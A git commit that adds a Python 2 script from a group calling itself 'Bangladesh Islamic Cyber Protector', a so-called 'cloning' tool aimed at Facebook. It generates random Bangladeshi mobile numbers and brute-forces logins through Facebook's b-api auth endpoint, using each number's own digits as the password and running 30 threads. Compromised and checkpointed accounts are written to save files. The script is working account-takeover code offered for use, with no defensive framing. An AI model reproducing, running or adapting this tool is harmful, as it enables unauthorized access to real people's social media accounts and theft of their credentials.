bf29f55d5a18fb9ca1e48804ab23bcfa6c93cbb8
Bangladesh Islamic Cyber Protector <98581680+BD-Islamic-Cyber-Protector@users.noreply.github.com>
2022-01-28 20:00:04 +0600

    Add files via upload

---
+++ BICP08.py
@@ -0,0 +1,307 @@
+
+# IT'S AFRIDI
+import os, sys, time, datetime, random, hashlib, re, threading, json, urllib, cookielib, getpass
+os.system('rm -rf .txt')
+
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+psb('\x1b[1;32mBANGLADESH 08 DIGIT CLONING START PLEASE WAIT ..........')
+for n in range(60000):
+    nmbr = random.randint(11111111, 99999999)
+    sys.stdout = open('.txt', 'a')
+    print nmbr
+    sys.stdout.flush()
+
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(1)
+
+from multiprocessing.pool import ThreadPool
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
+br.addheaders = [('user-agent', 'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
+
+def exb():
+    print '[!] Exit'
+    os.sys.exit()
+
+
+def psb(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(0.03)
+
+
+def jalan(z):
+    for e in z + '\n':
+        sys.stdout.write(e)
+        sys.stdout.flush()
+        time.sleep(3.0 / 200)
+
+
+def t():
+    time.sleep(1)
+
+
+def cb():
+    os.system('clear')
+
+
+logo =    """ 
+    \033[2;95m d8888b. d888888b  .o88b. d8888b.    \033[1;97m[\033[1;94m+\033[1;97m] XX \033[1;93m: \033[1;97m Black Panther
+    \033[2;95m 88  `8D   `88'   d8P  Y8 88  `8D        \033[1;97m[\033[1;94m+\033[1;97m] AU \033[1;93m: \033[1;97m  [Mahbub Alam Khan]
+    \033[2;96m 88oooY'    88    8P      88oodD'      \033[1;97m[\033[1;94m+\033[1;97m] FB \033[1;93m: \033[1;97m fb.com/Mahbub.Alam.Khan.002
+    \033[2;96m 88~~~b.    88    8b      88~~~       \033[1;97m[\033[1;94m+\033[1;97m] Page \033[1;93m: \033[1;97m BICP.Team.Help.Zone
+    \033[2;94m 88   8D   .88.   Y8b  d8 88          \033[1;97m[\033[1;94m+\033[1;97m] Team \033[1;93m: \033[1;97m BICP
+    \033[2;94m Y8888P' Y888888P  `Y88P' 88            \033[1;97m[\033[1;94m+\033[1;97m] CM \033[1;93m: \033[1;97m B-Api.Fb
+    \033[1;97m---------------------------------------------------------
+
+"""
+back = 0
+successful = []
+cpb = []
+oks = []
+id = []
+print 'AUTHOR : BICP'
+print 'FACEBOOK : Bangladesh Islamic Cyber Protector'
+print 'GITHUB : BICP'
+CorrectUsername = 'BICP'
+CorrectPassword = 'BD08'
+loop = 'true'
+while loop == 'true':
+    username = raw_input('\x1b[1;91m \x1b[1;92mUSERNAME \x1b[1;92m: \x1b[1;92m')
+    if username == CorrectUsername:
+        password = raw_input('\x1b[1;91m \x1b[1;92mPASSWORD \x1b[1;92m: \x1b[1;92m')
+        if password == CorrectPassword:
+            print 'Logged in successfully as ' + username
+            time.sleep(2)
+            loop = 'false'
+        else:
+            print '\x1b[1;97mWrong Password'
+            os.system('xdg-open https://www.facebook.com/BICP.Team.Help.Zone')
+    else:
+        print '\x1b[1;97mWrong Username'
+        os.system('xdg-open https://www.facebook.com/BICP.Team.Help.Zone')
+
+name = raw_input('\x1b[1;92m\x1b[1;92m Enter Your Gf Name: ')
+os.system('xdg-open https://www.facebook.com/BICP.Team.Help.Zone')
+
+def menu():
+    os.system('clear')
+    print logo
+    print '\x1b[1;90mONLY \x1b[1;90m11 \x1b[1;90mDIGITS HACKABLE ACCOUNTS ARE AVAILABLE'
+    print
+    jalan('\x1b[1;92m[1]  \x1b[1;92mGRAMEENPHONE')
+    jalan('\x1b[1;96m[2]  \x1b[1;96mROBI')
+    jalan('\x1b[1;92m[3]  \x1b[1;92mAIRTEL')
+    jalan('\x1b[1;96m[4]  \x1b[1;96mBANGLALINK')
+    jalan('\x1b[1;92m[5]  \x1b[1;92mTELETALK')
+    jalan('\x1b[1;96m[6]  \x1b[1;96mGRAMEENPHONE \x1b[1;91m(NEW)')
+    jalan('\x1b[1;92m[7]  \x1b[1;92mBANGLALINK \x1b[1;91m(NEW)')
+    print
+    jalan('\x1b[1;90m[8] FIND ME ON FACEBOOK PAGE')
+    jalan('\x1b[1;90m[9] TO CONTACT ADMIM')
+    print
+    jalan('\x1b[1;97m[00]  EXIT')
+    print 50 * '-'
+    action()
+
+
+def action():
+    global cpb
+    global oks
+    bch = raw_input('\n\x1b[1;92m\xe2\x96\x84\xef\xb8\xbb\xcc\xb7\xcc\xbf\xe2\x94\xbb\xcc\xbf\xe2\x95\x90\xe2\x94\x81\xe4\xb8\x80   ')
+    if bch == '':
+        print '[!] Fill in correctly'
+        action()
+    elif bch == '1':
+        os.system('clear')
+        print logo
+        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m017'
+        try:
+            c = raw_input('\x1b[1;97mCHOOSE CODE (017) : ')
+            k = '+88'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '2':
+        os.system('clear')
+        print logo
+        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m018'
+        try:
+            c = raw_input('\x1b[1;97mCHOOSE CODE (018)  : ')
+            k = '+88'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '3':
+        os.system('clear')
+        print logo
+        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m016'
+        try:
+            c = raw_input('\x1b[1;97mCHOOSE CODE (016) : ')
+            k = '+88'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '4':
+        os.system('clear')
+        print logo
+        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m019'
+        try:
+            c = raw_input('\x1b[1;97mCHOOSE CODE (019) : ')
+            k = '+88'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '5':
+        os.system('clear')
+        print logo
+        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m015'
+        try:
+            c = raw_input('\x1b[1;97mCHOOSE CODE (015) : ')
+            k = '+88'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '6':
+        os.system('clear')
+        print logo
+        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m013'
+        try:
+            c = raw_input('\x1b[1;97mCHOOSE CODE (013) : ')
+            k = '+88'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '7':
+        os.system('clear')
+        print logo
+        print '\x1b[1;97mSIM CODE: TYPE \x1b[1;91m014'
+        try:
+            c = raw_input('\x1b[1;97mCHOOSE CODE (014) : ')
+            k = '+88'
+            idlist = '.txt'
+            for line in open(idlist, 'r').readlines():
+                id.append(line.strip())
+
+        except IOError:
+            print '[!] File Not Found'
+            raw_input('\n[ Back ]')
+            menu()
+
+    elif bch == '8':
+        os.system('xdg-open https://www.facebook.com/BICP.Team.Help.Zone')
+        time.sleep(1)
+        menu()
+    elif bch == '9':
+        os.system('xdg-open https://www.facebook.com/BICP.Team.Help.Zone')
+        time.sleep(1)
+        menu()
+    elif bch == '00':
+        exb()
+    else:
+        print '[!] Fill in correctly'
+        action()
+    print '\x1b[1;90m======================================================>>'
+    xxx = str(len(id))
+    psb('\x1b[1;92m[\xe2\x9c\x94] Total Numbers: ' + xxx)
+    time.sleep(0.5)
+    psb('\x1b[1;93m[\xe2\x9c\x93]\x1b[1;93m Please wait, process is running ...')
+    time.sleep(0.5)
+    psb('\x1b[1;96m[!] To Stop Process Press CTRL Then Press z')
+    time.sleep(0.5)
+    print '\x1b[1;90m=======================================================>>'
+
+    def main(arg):
+        user = arg
+        try:
+            os.mkdir('save')
+        except OSError:
+            pass
+
+        try:
+            pass1 = user
+            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + c + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;92m[BICP-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
+                okb = open('save/successfull.txt', 'a')
+                okb.write(k + c + user + '|' + c + pass1 + '\n')
+                okb.close()
+                oks.append(c + user + c + pass1)
+            elif 'www.facebook.com' in q['error_msg']:
+                print '\x1b[1;96m[BICP-CP] \x1b[1;97m' + k + c + user + ' | ' + pass1 + '\x1b[1;96m  [Open After 07 Days]\n'
+                cps = open('save/checkpoint.txt', 'a')
+                cps.write(k + c + user + '|' + c + pass1 + '\n')
+                cps.close()
+                cpb.append(c + user + c + pass1)
+        except:
+            pass
+
+    p = ThreadPool(30)
+    p.map(main, id)
+    print 50 * '-'
+    print '[\xe2\x9c\x93] Process Has Been Completed....'
+    print '[\xe2\x9c\x93] Total OK/CP : ' + str(len(oks)) + '/' + str(len(cpb))
+    print '[\xe2\x9c\x93] CP File Has Been Saved : save/checkpoint.txt'
+    raw_input('\n[Press Enter To Go Back]')
+    os.system('python2 sh11.py')
+
+
+if __name__ == '__main__':
+    menu()
